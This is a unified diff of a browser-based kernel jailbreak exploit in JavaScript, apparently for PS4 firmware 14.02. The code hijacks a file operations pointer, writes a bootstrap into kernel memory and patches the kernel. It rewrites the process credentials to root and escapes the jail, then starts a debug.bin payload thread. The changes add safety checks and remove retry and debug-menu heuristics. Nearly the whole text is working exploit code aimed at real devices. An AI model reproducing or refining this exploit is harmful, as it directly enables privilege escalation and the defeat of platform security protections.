-    if (!ran(r2b)) {
-      say("    the chain did not run -- the hole was refilled with a real object");
-      STATE.retry = true;
-      return false;
-    }
-  }
-
-  let hit = null, walked = 0;
-  for (let k = 0; k < reach; k++) {
-    const from = qAt(maps, k * TUNE.stride + 0x20);
-    const upto = qAt(maps, k * TUNE.stride + 0x28);
-    if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
-    if (upto.hi - from.hi > 0x100) break;
-    walked = k + 1;
-    const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
-    const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
-    if (above && below) { hit = k; break; }
-  }
-  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
-  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }
+  const captured = await captureHostState(shot, kbase, probe, reach, hostPage);
+  if (!captured) return false;
+  const { file, ops, ftab, maps, hit, here } = captured;
 
   const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
   const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
-  const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
   const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;
 
   say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
       + " ceiling=0x" + ceiling.toString(16));
-  if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
-      || Math.floor(now / 4) % 2 !== 1) {
+  if (locked % 2 === 1 || !inHeap(here) || (here.low & 7) !== 0 ||
+      now !== 5 || ceiling !== 5) {
     say("    not the mapping we want -- nothing written"); return false;
+  }
+
+  const guardRightsRef = alloc(16), guardOpsRef = alloc(16);
+  const guardRightsOut = alloc(4), guardOpsOut = alloc(8);
+  pokeAt(guardRightsRef, 0, plus(here, 0x5c));
+  pokeAt(guardOpsRef, 0, plus(file, 8));
+  wipe(guardRightsOut, 4); wipe(guardOpsOut, 8);
+  if (!await checkpoint("writer-guard-armed", "re-read VM rights and probe f_ops")) {
+    say("[4] PC collector did not acknowledge the write guard"); return false;
+  }
+  const guardShot = shot.take(function (c) {
+    c.load_rax(guardRightsRef.at); c.grab(guardRightsOut.at, 4);
+    c.load_rax(guardOpsRef.at); c.grab(guardOpsOut.at, 8);
+  });
+  if (!ran(guardShot) || guardRightsOut.dv.getUint32(0, true) !== rights ||
+      !same(qAt(guardOpsOut, 0), ops)) {
+    say("[4] live write targets changed; no kernel write attempted"); return false;
   }
 
   let widened = rights;
@@ -1220,56 +1411,73 @@ async function attempt(ctx, opts) {
   const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
   pokeAt(ftab, 0x18, hostFree);
 
+  if (!await checkpoint("writer-armed", "first kernel writes: VM rights and probe f_ops")) {
+    say("[5] PC collector did not acknowledge the writer"); return false;
+  }
   const r3 = shot.take(function (c) {
     c.put(plus(here, 0x5c), wRights.at, 4);
     c.put(plus(file, 0x08), wTable.at, 8);
   });
   say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
-  if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }
+  if (!ran(r3)) {
+    say("[5] writer did not return; kernel state is unknown. Keep page open and cold power off");
+    return false;
+  }
 
   if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
-    say("    page did not turn writable -- not calling into it"); return false;
+    say("[5] page did not turn writable; file hook may remain. Cold power off"); return false;
   }
   const boot = unhex(BOOTSTRAP);
-  if (K.anchor === 0xe6c30) {
-    for (let bi = 0; bi < boot.length - 6; bi++) {
-      if (boot[bi] === 0xc6 && boot[bi+1] === 0x81 && boot[bi+3] === 0xaa
-          && boot[bi+4] === 0x1f && boot[bi+5] === 0x00 && boot[bi+6] === 0x37) {
-        boot[bi+3] = 0xae;
-        say("[5b] bootstrap fixup: offset byte at +" + bi + " shifted aa->ae (+0x400)");
-      }
-    }
-  }
 
   wrbuf(hostFree, boot);
   if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
-    say("    bootstrap did not stick"); return false;
+    say("[5] bootstrap copy failed; file hook may remain. Cold power off"); return false;
   }
 
   const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-  const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
-  sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
+  const m1Good = m1.i32 !== -1 && (m1.hi >>> 0) !== 0;
+  const before = m1Good ? sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32 : -1;
+  if (!await checkpoint("bootstrap-armed", "ioctl will invoke the verified 14.02 bootstrap"))
+    say("[5] PC collector did not acknowledge bootstrap; restoring hook remains essential");
+  const ioctlRv = sc(S.ioctl, probe,
+    0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at).i32;
+  const ioctlErrno = ioctlRv === 0 ? 0 : host().errno();
   const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-  const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;
+  const m2Good = m2.i32 !== -1 && (m2.hi >>> 0) !== 0;
+  const after = m2Good ? sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32 : -1;
+  say("[6] bootstrap ioctl=" + ioctlRv + " errno=" + ioctlErrno +
+      " rwx before=" + before + " after=" + after);
+  await checkpoint("bootstrap-returned", "ioctl=" + ioctlRv + " rwx=" + before + "/" + after);
 
   const k = openRing0(hostFree);
   const thread = (before !== 0 && after === 0) ? k.thread() : null;
   const gated = thread !== null && inHeap(thread);
 
-  if (!(gated && k.write_v(plus(file, 0x08), ops))) {
-    const wOld = alloc(16); pokeAt(wOld, 0, ops);
-    shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
+  if (!gated) {
+    say("[6] gate unavailable; probe cannot be safely closed. Keep page open and cold power off");
+    return false;
   }
-  sc(S.close, probe);
+  await checkpoint("restore-armed", "restoring original probe f_ops pointer");
+  const restoreWritten = k.write_v(plus(file, 0x08), ops);
+  const restoredOps = restoreWritten ? k.read_v(plus(file, 0x08)) : null;
+  if (!restoredOps || !same(restoredOps, ops)) {
+    say("[6] probe f_ops was not verified restored. Keep page open and cold power off");
+    return false;
+  }
+  const probeClose = sc(S.close, probe).i32;
+  if (probeClose !== 0) {
+    say("[6] probe close failed; cold power off after this page");
+    return false;
+  }
+  await checkpoint("restore-complete", "probe f_ops restored and descriptor closed");
 
-  if (before === 0 || after !== 0) {
-    say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
+  if (ioctlRv !== 0 || !m1Good || !m2Good || before === 0 || after !== 0) {
+    say("[6] bootstrap result failed, rwx " + before + " before and " + after + " after -- "
         + shot.fired + " shots used");
     return false;
   }
   say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");
 
-  if (!gated) { say("[7] the gate did not answer"); return false; }
   const base2 = k.base();
   if (!base2 || !same(base2, kbase)) {
     say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
@@ -1295,36 +1503,14 @@ async function attempt(ctx, opts) {
     return false;
   };
 
-  {
-    const SHIFTS = [0, 16, 768, 864, 880, 992, 1024, 1152, 1200, 1280];
-    let adj = 0;
-    for (let i = 0; i < PATCHES.length; i++) {
-      const off = PATCHES[i][0];
-      const nb = unhex(PATCHES[i][1]);
-      const cur = k.read(kat(off), nb.length);
-      if (cur && sameBytes(cur, nb)) continue;
-
-      let expect1 = (nb[0] === 0xEB) ? 0x75 : -1;
-      if (nb[0] === 0x90 && nb.length > 1 && nb[1] === 0xE9) expect1 = 0x0F;
-
-      if (expect1 < 0) continue;
-      if (cur && cur[0] === expect1) continue;
-
-      let best = -1;
-      for (let s = 0; s < SHIFTS.length; s++) {
-        const t = k.read(kat(off + SHIFTS[s]), 1);
-        if (t && t[0] === expect1) { best = SHIFTS[s]; break; }
-      }
-      if (best > 0) {
-        say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16));
-        PATCHES[i][0] = off + best;
-        adj++;
-      } else {
-        say("[7b] " + PATCHES[i][2] + " at 0x" + off.toString(16) + " unresolved");
-      }
-    }
-    if (adj > 0) say("[7b] adjusted " + adj + " patch offsets for this firmware");
+  for (const spec of PATCH_WINDOWS) {
+    const stock = unhex(spec[1]);
+    const got = k.read(kat(spec[0]), stock.length);
+    if (!got || !sameBytes(got, stock))
+      return failOut("[7b] exact 14.02 stock window changed at 0x" +
+        spec[0].toString(16) + " -- no host patch written");
   }
+  say("[7b] all 15 exact 14.02 host patch windows still stock");
 
   if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
   let done = 0, failed = null;
@@ -1345,26 +1531,25 @@ async function attempt(ctx, opts) {
   const ucred = proc && k.read_v(plus(proc, 0x40));
   if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }
 
+  const prison0 = k.read_v(kat(K.prison0));
+  const rootvnode = k.read_v(kat(K.rootvnode));
+  if (!prison0 || !inText(prison0) ||
+      !rootvnode || !inHeap(rootvnode))
+    return failOut("[9] prison0 or rootvnode failed validation before credential writes");
+
   const z4 = new Uint8Array([0, 0, 0, 0]);
   const offs = [0x04, 0x08, 0x0c, 0x14];
-  for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
-  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));
-
-  const prison0 = k.read_v(kat(K.prison0));
-  if (!prison0 || !inText(prison0)) {
-    return failOut(
-      "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
-        + " -- not touching credentials",
-    );
-  }
-  k.write_v(plus(ucred, 0x30), prison0);
+  for (let i = 0; i < offs.length; i++)
+    if (!k.write(plus(ucred, offs[i]), z4))
+      return failOut("[9] credential group write failed");
+  if (!k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0])) ||
+      !k.write_v(plus(ucred, 0x30), prison0))
+    return failOut("[9] credential root or prison write failed");
   const caps = new Uint8Array(16); caps.fill(0xff);
-  k.write(plus(ucred, 0x60), caps);
-
-  const rootvnode = k.read_v(kat(K.rootvnode));
-  if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
-  k.write_v(plus(fdt, 0x10), rootvnode);
-  k.write_v(plus(fdt, 0x18), rootvnode);
+  if (!k.write(plus(ucred, 0x60), caps) ||
+      !k.write_v(plus(fdt, 0x10), rootvnode) ||
+      !k.write_v(plus(fdt, 0x18), rootvnode))
+    return failOut("[9] capability or root directory write failed");
 
   if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
   say("[9] jailbroken, uid 0");
@@ -1410,113 +1595,30 @@ async function attempt(ctx, opts) {
   say(iface.defused
       ? "handles defused -- this page may close"
       : "the handles are NOT defused -- do not let this page close");
-
-  (function () {
-    var TEXT_SIZE = 0xCFE880;
-    var DATA_OFF  = 0x1520000;
-
-    var c = k.begin();
-    c.hex("48bf").qw(kbase);
-    c.hex("48be").qw(plus(kbase, TEXT_SIZE));
-    c.hex("48ba").qw(v(0x676d6372, 0x65645f72));
-    c.hex("4839f7").hex("730b");
-    c.hex("483917").hex("740b");
-    c.hex("4883c701").hex("ebf0");
-    c.hex("4831c0").hex("eb03");
-    c.hex("4889f8");
-    c.hex("49ba").qw(plus(k.at, OUT));
-    c.hex("498902");
-    if (!k.run()) return;
-    var strAddr = k.out();
-    if (!strAddr || isZero(strAddr)) return;
-
-    var tail = k.read(plus(strAddr, 8), 8);
-    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;
-
-    var c2 = k.begin();
-    c2.hex("48bf").qw(plus(kbase, DATA_OFF));
-    c2.hex("48be").qw(plus(kbase, DATA_OFF + 0x700000));
-    c2.hex("48ba").qw(strAddr);
-    c2.hex("4839f7").hex("730b");
-    c2.hex("483917").hex("740b");
-    c2.hex("4883c708").hex("ebf0");
-    c2.hex("4831c0").hex("eb03");
-    c2.hex("4889f8");
-    c2.hex("49ba").qw(plus(k.at, OUT));
-    c2.hex("498902");
-    if (!k.run()) return;
-    var hit = k.out();
-    if (!hit || isZero(hit)) return;
-
-    var fn = k.read_v(plus(hit, 0x08));
-    if (!fn || isZero(fn)) return;
-    var fnRva = (fn.low - kbase.low) >>> 0;
-    if (fnRva >= TEXT_SIZE) return;
-
-    var body = k.read(fn, 80);
-    if (!body) return;
-
-    var target = null;
-    for (var i = 0; i < body.length - 6; i++) {
-      if (body[i] === 0xe8 && body[i + 5] === 0x85) {
-        var d = body[i+1] | (body[i+2]<<8) | (body[i+3]<<16) | (body[i+4]<<24);
-        if (d >= 0x80000000) d -= 0x100000000;
-        var ct = fnRva + i + 5 + d;
-        if (ct > 0 && ct < TEXT_SIZE) {
-          target = ct;
-          say("[dbg] rcmgr check at rva 0x" + ct.toString(16));
-          break;
-        }
-      }
-    }
-
-    if (target === null) { say("[dbg] no CALL+TEST in handler"); return; }
-
-    var target2 = null;
-    for (var j = i + 5; j < body.length - 6; j++) {
-      if (body[j] === 0xe8 && body[j + 5] === 0x85) {
-        var d2 = body[j+1] | (body[j+2]<<8) | (body[j+3]<<16) | (body[j+4]<<24);
-        if (d2 >= 0x80000000) d2 -= 0x100000000;
-        var ct2 = fnRva + j + 5 + d2;
-        if (ct2 > 0 && ct2 < TEXT_SIZE && ct2 !== target) {
-          target2 = ct2;
-          say("[dbg] rcmgr check2 at rva 0x" + ct2.toString(16));
-          break;
-        }
-      }
-    }
-
-    var plist = [
-      [target, "b8010000", "rcmgr1a"],
-      [target + 4, "00c3", "rcmgr1b"]
-    ];
-    if (target2 !== null) {
-      plist.push([target2, "b8010000", "rcmgr2a"]);
-      plist.push([target2 + 4, "00c3", "rcmgr2b"]);
-    }
-    k.apply(kbase, plist);
-    say("debug menu enabled -- go to Settings");
-  })();
-
-  /* ---- Load debug.bin payload ---- */
-  say("[p] Attempting to load debug.bin");
-  try {
-    iface.payload = await loadPayload("debug.bin");
-    if (iface.payload) {
-      say("[p] debug.bin loaded successfully");
-    } else {
-      say("[p] debug.bin failed to load");
-    }
-  } catch (e) {
-    say("[p] Error loading debug.bin: " + (e && e.message));
+  if (!iface.defused) {
+    iface.payload = false;
+    say("[p] payload held: handles remain armed. Keep page open and cold power off");
+    return iface;
   }
 
-  say("done -- jailbroken, rwx open, debug settings enabled");
-  say("========================================");
-  say("  JAILBREAK COMPLETE -- FW " + (host().state && host().state.fw ? host().state.fw : "14.xx"));
-  say("  Patches: " + done + "/" + PATCHES.length);
-  say("  Debug Settings: check PS4 Settings");
-  say("========================================");
+  /* Debug-menu heuristic writes removed; debug.bin handles its own runtime. */
+
+  /* ---- Load debug.bin payload ---- */
+  say("[p] Attempting to start corrected debug.bin as a thread");
+  try {
+    iface.payload = await loadPayload("debug-1402-fixed.bin", debugBytes);
+    if (iface.payload) {
+      say("[p] pthread_create returned success; HEN runtime remains unconfirmed");
+    } else {
+      say("[p] corrected debug.bin thread did not start");
+    }
+  } catch (e) {
+    iface.payload = false;
+    say("[p] Error starting corrected debug.bin: " + (e && e.message));
+  }
+
+  say("[p] one-shot finished; kernel patches " + done + "/" + PATCHES.length +
+      "; pthread start=" + !!iface.payload + "; HEN status unconfirmed");
   return iface;
 }
 
@@ -1531,6 +1633,40 @@ async function fetchBytes(url, tag) {
     say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
     return null;
   }
+}
+
+function resolvePthreadCreate() {
+  const c = host();
+  if (!c.libkernelBase) return null;
+  const ids = alloc(4 * 0x300), count = alloc(8), info = alloc(0x160);
+  wipe(ids, ids.u8.length); wipe(count, 8);
+  if (sc(S.dynlib_get_list, ids.at, 0x300, count.at).i32 !== 0) return null;
+  const n = count.dv.getUint32(0, true);
+  if (n === 0 || n > 0x300) return null;
+  for (let i = 0; i < n; i++) {
+    wipe(info, 0x160); info.dv.setUint32(0, 0x160, true);
+    const id = ids.dv.getUint32(i * 4, true);
+    if (sc(S.dynlib_get_info, id, info.at).i32 !== 0) continue;
+    let name = "";
+    for (let j = 8; j < 0x100 && info.u8[j] !== 0; j++)
+      name += String.fromCharCode(info.u8[j]);
+    if (!/^libkernel(?:_web)?\.sprx$/i.test(name) ||
+        !same(qAt(info, 0x108), c.libkernelBase)) continue;
+    for (const symbol of ["pthread_create", "scePthreadCreate"]) {
+      const out = alloc(8); wipe(out, 8);
+      const rv = sc(S.dynlib_dlsym, id, cstr(symbol).at, out.at).i32;
+      if (rv !== 0) continue;
+      const fn = qAt(out, 0);
+      const delta = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW +
+        (fn.low - (c.libkernelBase.low >>> 0));
+      if (fn.hi === (c.libkernelBase.hi >>> 0) && delta > 0 && delta < 0x400000) {
+        say("[p] resolved " + symbol + " through libkernel handle " + id +
+          " at +0x" + delta.toString(16));
+        return fn;
+      }
+    }
+  }
+  return null;
 }
 
 async function loadPayload(url, vorab) {
@@ -1581,37 +1717,24 @@ async function loadPayload(url, vorab) {
     }
   }
   
-  for (let o = 0; o < 10; o++) wr1(plus(entry, 0x1068 + o), 0x90);
-  wr1(plus(entry, 0x3490), 0x00); wr1(plus(entry, 0x3491), 0x0d);
-  wr1(plus(entry, 0x3492), 0x52); wr1(plus(entry, 0x3493), 0x01);
-  say("[p] console-output write NOP'd (0x1068), M_TEMP -> 0x1520d00 (0x3490)");
-  
-  for (let o = 0; o < 4; o++) wr1(plus(entry, 0x1136 + o), 0x90);
-  say("[p] kpayload entry call NOP'd (0x1136) -- loader-only run");
-  say("[p] payload copied and verified, starting thread");
+  say("[p] corrected debug.bin copied byte-for-byte and verified, starting thread");
 
-  const SLOT_1352 = 0x3cb9c00;
-  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_1352;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
+  const fn = STATE.pthread;
+  if (!fn) {
+    say("[p] pthread_create could not be resolved exactly from libkernel -- not calling it");
     return false;
   }
-  const fnr = c.p.read8(c.webkitBase.add32(slot));
-  const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
-        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
+  if (!await checkpoint("pthread-armed", "starting corrected debug.bin thread")) {
+    say("[p] PC collector did not acknowledge payload start");
     return false;
   }
-  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
 
   const thr = alloc(8);
   thr.u8.fill(0);
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
   const handle = qAt(thr, 0);
   const started = rc === 0 && (handle.hi >>> 0) > 0;
+  await checkpoint("pthread-returned", "rc=" + rc + " handle=" + text(handle));
   say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
       + (started ? " -- running" : " -- did NOT start"));
   return started;
@@ -1619,14 +1742,5 @@ async function loadPayload(url, vorab) {
 
 /* End of file */
 export async function runAfterglow(ctx, opts) {
-  const max = (opts && opts.tries) || 4;
-  for (let n = 1; n <= max; n++) {
-    const r = await attempt(ctx, opts);
-    if (r) return r;
-    if (!STATE.retry) return false;
-    if (n === max) { say("gave up after " + n + " attempts"); return false; }
-    say("attempt " + n + " fell short -- going again");
-    await new Promise(function (ok) { setTimeout(ok, 400); });
-  }
-  return false;
+  return attempt(ctx, opts);
 }
